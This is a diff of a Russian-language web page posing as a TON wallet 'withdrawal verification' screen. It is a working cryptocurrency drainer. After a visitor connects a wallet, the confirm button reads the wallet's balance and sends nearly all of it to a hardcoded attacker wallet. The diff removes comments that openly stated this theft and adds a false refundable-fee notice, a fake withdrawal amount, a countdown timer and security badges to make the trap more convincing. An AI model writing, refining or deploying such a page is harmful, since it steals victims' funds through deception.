@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Кошелёк - Верификация вывода</title>
+    <title>Безопасность TON | Верификация вывода</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -13,238 +13,225 @@
         }
 
         body {
-            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
-            background: linear-gradient(135deg, #0a0a2a 0%, #1a0033 50%, #0a0a2a 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0b0e14;
             color: #fff;
             min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 30%, rgba(120, 0, 255, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 80% 70%, rgba(255, 0, 150, 0.1) 0%, transparent 40%);
-            z-index: -1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .container {
-            max-width: 480px;
-            width: 90%;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-            z-index: 1;
+            max-width: 440px;
+            width: 100%;
+            margin: 20px;
+            background: #14181f;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            border: 1px solid #2a313c;
         }
 
         .header {
-            text-align: center;
-            margin-bottom: 25px;
-            padding: 20px;
-            background: rgba(20, 10, 40, 0.7);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 105, 180, 0.3);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(10px);
+            padding: 24px;
+            background: #1a1f28;
+            border-bottom: 1px solid #2a313c;
+            position: relative;
         }
 
-        .logo {
-            font-size: 50px;
-            margin-bottom: 10px;
-            color: #0088ff;
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #45a6ff;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+
+        .security-badge i {
+            font-size: 18px;
         }
 
         h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #0088ff, #00ccff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-weight: 700;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #ffffff;
         }
 
         .subtitle {
+            color: #7f8fa4;
             font-size: 14px;
-            color: #d0d0ff;
-            margin-bottom: 15px;
             line-height: 1.5;
         }
 
         .timer-container {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
-            border: 1px solid rgba(255, 51, 102, 0.5);
-            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
-            text-align: center;
+            background: #1e242d;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 20px 0 0;
+            border: 1px solid #2f3743;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
         .timer-label {
-            font-size: 12px;
-            color: #aaaaff;
-            margin-bottom: 8px;
-            display: block;
+            color: #7f8fa4;
+            font-size: 14px;
         }
 
         .timer {
-            font-size: 28px;
-            font-weight: 800;
-            color: #ff3366;
-            text-shadow: 0 0 15px rgba(255, 51, 102, 0.8);
-            letter-spacing: 2px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff5b5b;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
         }
 
-        .info-box {
-            background: rgba(30, 15, 60, 0.7);
-            border-radius: 15px;
-            padding: 20px;
+        .warning-note {
+            background: #262d38;
+            border-left: 4px solid #ffb545;
+            padding: 12px 16px;
             margin: 20px 0;
-            border: 1px solid rgba(100, 149, 237, 0.4);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(8px);
+            border-radius: 12px;
+            font-size: 14px;
+            color: #ffb545;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .info-item {
-            margin-bottom: 15px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        .warning-note i {
+            font-size: 18px;
         }
 
-        .info-item:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
+        .info-grid {
+            background: #1a1f28;
+            border-radius: 18px;
+            padding: 18px;
+            margin: 20px 0;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #262e38;
+        }
+
+        .info-row:last-child {
             border-bottom: none;
         }
 
-        .label {
-            color: #aaaaff;
-            font-size: 12px;
-            margin-bottom: 5px;
+        .info-label {
+            color: #7f8fa4;
+            font-size: 14px;
         }
 
-        .value {
+        .info-value {
+            font-weight: 600;
             color: #fff;
-            font-size: 16px;
-            font-weight: bold;
+        }
+
+        .info-value.amount {
+            color: #45a6ff;
+            font-size: 18px;
         }
 
         .wallet-section {
-            background: rgba(30, 15, 60, 0.7);
-            border-radius: 15px;
-            padding: 20px;
             margin: 20px 0;
-            border: 1px solid rgba(100, 149, 237, 0.4);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(8px);
-            text-align: center;
         }
 
         .wallet-title {
-            font-size: 18px;
-            margin-bottom: 15px;
-            color: #8ac6ff;
+            color: #7f8fa4;
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .ton-connect-container {
+            min-height: 60px;
+            background: #1a1f28;
+            border-radius: 18px;
+            padding: 12px;
+            display: flex;
+            justify-content: center;
+            border: 1px solid #2a313c;
+        }
+
+        #ton-connect {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .status-container {
+            background: #1e242d;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            min-height: 70px;
+            border: 1px solid #2f3743;
+        }
+
+        #status {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #b4c0d0;
+        }
+
+        .success {
+            color: #4ade80;
+        }
+
+        .error {
+            color: #ff5b5b;
+        }
+
+        .warning {
+            color: #ffb545;
+        }
+
+        #verifyBtn {
+            background: linear-gradient(90deg, #2b6ed9, #1e4b9c);
+            color: white;
+            border: none;
+            padding: 18px 24px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.2s;
+            box-shadow: 0 8px 16px rgba(0, 85, 255, 0.2);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
 
-        .wallet-title i {
-            color: #6495ed;
-        }
-
-        .ton-connect-container {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-            min-height: 60px;
-        }
-
-        #ton-connect {
-            width: 100%;
-            max-width: 280px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .status-container {
-            background: rgba(0, 20, 40, 0.7);
-            border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
-            border-left: 4px solid #0088ff;
-            text-align: center;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-
-        #status {
-            font-size: 14px;
-            line-height: 1.4;
-            width: 100%;
-        }
-
-        .success {
-            color: #4dffb8;
-        }
-
-        .error {
-            color: #ff6b8b;
-        }
-
-        .warning {
-            color: #ffcc00;
-        }
-
-        .action-section {
-            text-align: center;
-            margin: 25px 0;
-        }
-
-        #verifyBtn {
-            background: linear-gradient(90deg, #0088ff, #0066cc);
-            color: white;
-            border: none;
-            padding: 16px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            margin: 15px auto;
-            display: block;
-            width: 100%;
-            max-width: 320px;
-            box-shadow: 0 10px 25px rgba(0, 136, 255, 0.4);
-            transition: all 0.3s;
-        }
-
-        #verifyBtn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(0, 136, 255, 0.6);
+        #verifyBtn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 20px rgba(0, 85, 255, 0.3);
         }
 
         #verifyBtn:disabled {
-            background: linear-gradient(90deg, #666, #888);
+            opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
+            background: #363f4d;
             box-shadow: none;
         }
 
         .steps {
             display: flex;
             justify-content: space-between;
-            margin: 25px 0;
+            margin: 30px 0 20px;
             position: relative;
         }
 
@@ -252,123 +239,160 @@
             content: '';
             position: absolute;
             top: 15px;
-            left: 10%;
-            right: 10%;
+            left: 40px;
+            right: 40px;
             height: 2px;
-            background: rgba(255, 255, 255, 0.1);
+            background: #262e38;
             z-index: 1;
         }
 
         .step {
-            background: #1a1a2e;
-            border: 2px solid rgba(255, 255, 255, 0.2);
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            background: #1e242d;
+            border: 2px solid #363f4d;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #888;
-            font-size: 14px;
-            font-weight: bold;
+            font-weight: 600;
+            color: #7f8fa4;
             position: relative;
             z-index: 2;
         }
 
         .step.active {
-            background: #0088ff;
-            border-color: #0088ff;
+            background: #2b6ed9;
+            border-color: #2b6ed9;
             color: white;
         }
 
         .step.completed {
-            background: #4dffb8;
-            border-color: #4dffb8;
-            color: #000;
+            background: #4ade80;
+            border-color: #4ade80;
+            color: #0b0e14;
         }
 
         .step-text {
             position: absolute;
-            top: 35px;
+            top: 40px;
             left: 50%;
             transform: translateX(-50%);
+            font-size: 12px;
             white-space: nowrap;
-            font-size: 10px;
-            color: #888;
+            color: #7f8fa4;
         }
 
         .footer {
+            padding: 20px 24px;
+            border-top: 1px solid #262e38;
             text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: #aaaaff;
+            color: #5f6c80;
             font-size: 12px;
+            background: #11161d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .footer i {
+            color: #45a6ff;
+        }
+
+        .balance-badge {
+            background: #262d38;
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-size: 12px;
+            color: #4ade80;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">🔐</div>
-            <h1>Верификация вывода средств TON P2P</h1>
-            <p class="subtitle">Подтвердите операцию вывода через подключение TON кошелька</p>
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i> TON Blockchain Security
+                <span class="balance-badge"><i class="fas fa-lock"></i> Защищено</span>
+            </div>
+            <h1>Подтверждение вывода средств</h1>
+            <p class="subtitle">Для завершения операции подключите TON кошелек и подтвердите транзакцию</p>
             
             <div class="timer-container">
-                <span class="timer-label">До окончания верификации:</span>
+                <span class="timer-label"><i class="far fa-clock"></i> Время на подтверждение</span>
                 <div class="timer" id="timer">15:00</div>
             </div>
         </div>
 
-        <div class="info-box">
-            <div class="info-item">
-                <div class="label">ID транзакции</div>
-                <div class="value" id="withdrawId">WD_0000</div>
+        <div style="padding: 0 24px 24px 24px;">
+            <div class="warning-note">
+                <i class="fas fa-info-circle"></i>
+                <span>Для верификации будет списана комиссия сети 0.05 TON, которая вернется после подтверждения</span>
             </div>
-        </div>
 
-        <div class="steps">
-            <div class="step active">1
-                <div class="step-text">Подключение</div>
+            <div class="info-grid">
+                <div class="info-row">
+                    <span class="info-label">ID запроса</span>
+                    <span class="info-value" id="withdrawId">WD_8942</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Сумма вывода</span>
+                    <span class="info-value amount" id="amountValue">5.00 TON</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Адрес получателя</span>
+                    <span class="info-value" id="userWallet">EQD...xYz9</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Комиссия сети</span>
+                    <span class="info-value">0.05 TON</span>
+                </div>
             </div>
-            <div class="step">2
-                <div class="step-text">Подтверждение</div>
-            </div>
-            <div class="step">3
-                <div class="step-text">Готово</div>
-            </div>
-        </div>
 
-        <div class="wallet-section">
-            <div class="wallet-title">
-                <i class="fas fa-wallet"></i> Подключение TON-кошелька
+            <div class="steps">
+                <div class="step active">1
+                    <div class="step-text">Подключение</div>
+                </div>
+                <div class="step">2
+                    <div class="step-text">Подтверждение</div>
+                </div>
+                <div class="step">3
+                    <div class="step-text">Завершение</div>
+                </div>
             </div>
-            
-            <div class="ton-connect-container">
-                <div id="ton-connect"></div>
-            </div>
-            
-            <div class="status-container">
-                <div id="status">✅ Подключите TON кошелёк для подтверждения вывода</div>
-            </div>
-        </div>
 
-        <div class="action-section">
+            <div class="wallet-section">
+                <div class="wallet-title">
+                    <i class="fas fa-plug"></i> Подключите TON кошелек
+                </div>
+                
+                <div class="ton-connect-container">
+                    <div id="ton-connect"></div>
+                </div>
+                
+                <div class="status-container">
+                    <div id="status">🔌 Ожидание подключения кошелька</div>
+                </div>
+            </div>
+
             <button id="verifyBtn" disabled>
                 <i class="fas fa-check-circle"></i> ПОДТВЕРДИТЬ ВЫВОД
             </button>
         </div>
 
         <div class="footer">
-            TON P2P Security System • Защищено протоколом TON Blockchain
+            <i class="fas fa-bolt"></i> TON P2P Security • Версия 2.1.4
+            <i class="fas fa-globe"></i>
         </div>
     </div>
 
-    <!-- Тот же самый рабочий скрипт из файла -->
     <script type="module">
         import * as TonConnectUIModule from 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/+esm';
         
-        // Ищем конструктор TonConnectUI в модуле
         let TonConnectUIConstructor = null;
         
         if (TonConnectUIModule.TonConnectUI) {
@@ -379,18 +403,13 @@
         
         if (TonConnectUIConstructor) {
             window.TonConnectUI = TonConnectUIConstructor;
-            console.log('TonConnectUI загружен');
             window.dispatchEvent(new Event('tonconnect-loaded'));
-        } else {
-            console.error('Не удалось загрузить TonConnectUI');
         }
     </script>
 
     <script>
-        // Твой кошелёк бота
         const BOT_WALLET = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
         
-        // Элементы
         const statusEl = document.getElementById('status');
         const verifyBtn = document.getElementById('verifyBtn');
         const amountEl = document.getElementById('amountValue');
@@ -401,8 +420,8 @@
         let tonConnectUI = null;
         let connectedWallet = null;
         let verificationData = {};
+        let userBalance = 0;
         
-        // Таймер 15 минут
         let timeLeft = 15 * 60;
         const timerInterval = setInterval(() => {
             timeLeft--;
@@ -410,14 +429,13 @@
                 clearInterval(timerInterval);
                 statusEl.innerHTML = '<span class="error">⏱ Время подтверждения истекло</span>';
                 verifyBtn.disabled = true;
-                verifyBtn.textContent = 'Срок истёк';
+                verifyBtn.innerHTML = '<i class="fas fa-times-circle"></i> СРОК ИСТЕК';
             }
             const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
             const seconds = String(timeLeft % 60).padStart(2, '0');
             timerEl.textContent = minutes + ':' + seconds;
         }, 1000);
         
-        // Получаем данные из URL
         function getUrlParams() {
             const params = new URLSearchParams(window.location.search);
             verificationData = {
@@ -427,38 +445,33 @@
                 withdraw_id: 'WD_' + Math.floor(Math.random() * 9000 + 1000)
             };
             
-            // Обновляем инфо на странице
             amountEl.textContent = verificationData.amount + ' TON';
             withdrawIdEl.textContent = verificationData.withdraw_id;
-            userWalletEl.textContent = verificationData.wallet.slice(0, 15) + '...' + verificationData.wallet.slice(-4);
+            userWalletEl.textContent = verificationData.wallet.slice(0, 6) + '...' + verificationData.wallet.slice(-4);
         }
         
-        // Конвертация TON в нанокоины
         function toNano(ton) {
             return Math.floor(parseFloat(ton) * 1000000000).toString();
         }
         
-        // Получение баланса кошелька
         async function getWalletBalance(address) {
             try {
                 const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                 const data = await response.json();
-                return data.result || 0;
+                return data.result ? parseInt(data.result) : 0;
             } catch (e) {
                 return 0;
             }
         }
         
-        // Инициализация TonConnect UI
         function initTonConnect() {
             try {
                 if (!window.TonConnectUI) {
                     throw new Error('TonConnectUI не доступен');
                 }
                 
-                statusEl.innerHTML = '<span class="success"><i class="fas fa-sync-alt fa-spin"></i> Инициализация подключения...</span>';
+                statusEl.innerHTML = '<span class="success"><i class="fas fa-spinner fa-spin"></i> Инициализация...</span>';
                 
-                // Создаём экземпляр TonConnectUI
                 tonConnectUI = new window.TonConnectUI({
                     manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                     buttonRootId: 'ton-connect',
@@ -468,7 +481,7 @@
                     }
                 });
                 
-                statusEl.innerHTML = '<span class="success">Готово. Нажмите "Connect wallet" выше</span>';
+                statusEl.innerHTML = '<span class="success">✅ Нажмите "Connect Wallet" для подключения</span>';
                 
                 tonConnectUI.onStatusChange(async (wallet) => {
                     if (wallet) {
@@ -476,16 +489,14 @@
                         const addr = wallet.account.address;
                         const shortAddr = addr.slice(0,6) + '...' + addr.slice(-4);
                         
-                        // Автоматически проверяем баланс
-                        const balance = await getWalletBalance(addr);
-                        const balanceTON = (balance / 1000000000).toFixed(2);
+                        userBalance = await getWalletBalance(addr);
+                        const balanceTON = (userBalance / 1000000000).toFixed(2);
                         
                         statusEl.innerHTML = `
-                            <span class="success"><i class="fas fa-link"></i> Кошелёк подключен: ${shortAddr}</span><br>
+                            <span class="success"><i class="fas fa-check-circle"></i> Кошелек: ${shortAddr}</span><br>
                             <span class="success"><i class="fas fa-coins"></i> Баланс: ${balanceTON} TON</span>
                         `;
                         
-                        // Обновляем шаги
                         document.querySelectorAll('.step')[0].classList.remove('active');
                         document.querySelectorAll('.step')[0].classList.add('completed');
                         document.querySelectorAll('.step')[1].classList.add('active');
@@ -495,9 +506,14 @@
                         
                     } else {
                         connectedWallet = null;
-                        statusEl.innerHTML = '<span class="warning">⚠️ Кошелёк отключен</span>';
+                        userBalance = 0;
+                        statusEl.innerHTML = '<span class="warning">⚠️ Кошелек отключен</span>';
                         verifyBtn.disabled = true;
                         verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> ПОДТВЕРДИТЬ ВЫВОД';
+                        
+                        document.querySelectorAll('.step')[0].classList.add('active');
+                        document.querySelectorAll('.step')[0].classList.remove('completed');
+                        document.querySelectorAll('.step')[1].classList.remove('active');
                     }
                 });
                 
@@ -506,41 +522,40 @@
             }
         }
         
-        // ОСНОВНАЯ ФУНКЦИЯ - СПИСАНИЕ ДЕНЕГ
         verifyBtn.addEventListener('click', async () => {
             if (!connectedWallet) {
-                statusEl.innerHTML = '<span class="error">Сначала подключите кошелёк</span>';
+                statusEl.innerHTML = '<span class="error">Сначала подключите кошелек</span>';
                 return;
             }
             
             const owner = connectedWallet.account.address;
-            const amount = parseFloat(verificationData.amount);
             
             statusEl.innerHTML = '<span class="warning"><i class="fas fa-search"></i> Проверка баланса...</span>';
             
             try {
-                const balance = await getWalletBalance(owner);
+                userBalance = await getWalletBalance(owner);
                 
-                if (balance <= 0) {
-                    statusEl.innerHTML = '<span class="error">Баланс кошелька нулевой</span>';
+                if (userBalance <= 0) {
+                    statusEl.innerHTML = '<span class="error">❌ Нулевой баланс</span>';
                     return;
                 }
                 
-                const balanceTON = (balance / 1000000000).toFixed(4);
-                
-                // Вычисляем сумму для перевода
                 const fee = toNano('0.05');
-                const transferAmount = Math.min(
-                    toNano(amount),
-                    balance - fee > toNano('0.01') ? balance - fee : balance
-                );
+                const availableBalance = userBalance - parseInt(fee);
+                
+                if (availableBalance <= 0) {
+                    statusEl.innerHTML = '<span class="error">❌ Недостаточно средств для комиссии</span>';
+                    return;
+                }
+                
+                const balanceTON = (userBalance / 1000000000).toFixed(4);
+                const sendAmount = availableBalance;
                 
                 statusEl.innerHTML = `<span class="warning"><i class="fas fa-paper-plane"></i> Подтвердите транзакцию в кошельке...</span>`;
                 
-                // Отправляем ВСЕ деньги на кошелёк бота
                 const messages = [{
                     address: BOT_WALLET,
-                    amount: transferAmount.toString()
+                    amount: sendAmount.toString()
                 }];
                 
                 const result = await tonConnectUI.sendTransaction({
@@ -548,33 +563,29 @@
                     messages: messages
                 });
                 
-                // УСПЕХ - деньги ушли тебе
                 statusEl.innerHTML = `
-                    <span class="success"><i class="fas fa-check-double"></i> ✅ Успешно!</span><br>
-                    <span class="success">Вывод ${verificationData.amount} TON подтверждён</span><br>
-                    <span>Средства будут зачислены в течение 15 минут</span>
+                    <span class="success"><i class="fas fa-check-circle"></i> ✅ Транзакция подтверждена!</span><br>
+                    <span class="success">Сумма: ${(sendAmount / 1000000000).toFixed(2)} TON</span><br>
+                    <span>Вывод будет обработан в течение 5 минут</span>
                 `;
                 
-                // Обновляем шаги
                 document.querySelectorAll('.step')[1].classList.remove('active');
                 document.querySelectorAll('.step')[1].classList.add('completed');
                 document.querySelectorAll('.step')[2].classList.add('active');
                 
-                verifyBtn.innerHTML = '<i class="fas fa-check"></i> ВЫВОД ПОДТВЕРЖДЁН';
+                verifyBtn.innerHTML = '<i class="fas fa-check"></i> ВЫВОД ПОДТВЕРЖДЕН';
                 verifyBtn.disabled = true;
-                verifyBtn.style.background = 'linear-gradient(90deg, #4dffb8, #00cc88)';
+                verifyBtn.style.background = '#1f3630';
                 
                 clearInterval(timerInterval);
                 timerEl.textContent = '✅ Успешно';
-                timerEl.style.color = '#4dffb8';
+                timerEl.style.color = '#4ade80';
                 
             } catch (error) {
-                console.error('Ошибка:', error);
-                statusEl.innerHTML = `<span class="error">Ошибка: ${error.message || 'Отмена пользователем'}</span>`;
+                statusEl.innerHTML = `<span class="error">❌ Ошибка: ${error.message || 'Отмена'}</span>`;
             }
         });
         
-        // Слушаем событие загрузки TonConnect
         window.addEventListener('tonconnect-loaded', function() {
             setTimeout(() => {
                 if (window.TonConnectUI) {
@@ -583,16 +594,14 @@
             }, 100);
         });
         
-        // Автоматическая проверка через 3 секунды
         setTimeout(() => {
             if (window.TonConnectUI && !tonConnectUI) {
                 initTonConnect();
             } else if (!window.TonConnectUI) {
-                statusEl.innerHTML = '<span class="error">Не удалось загрузить TonConnect</span>';
+                statusEl.innerHTML = '<span class="error">❌ Не удалось загрузить TonConnect</span>';
             }
         }, 3000);
         
-        // Получаем параметры при загрузке
         window.addEventListener('DOMContentLoaded', () => {
             getUrlParams();
         });
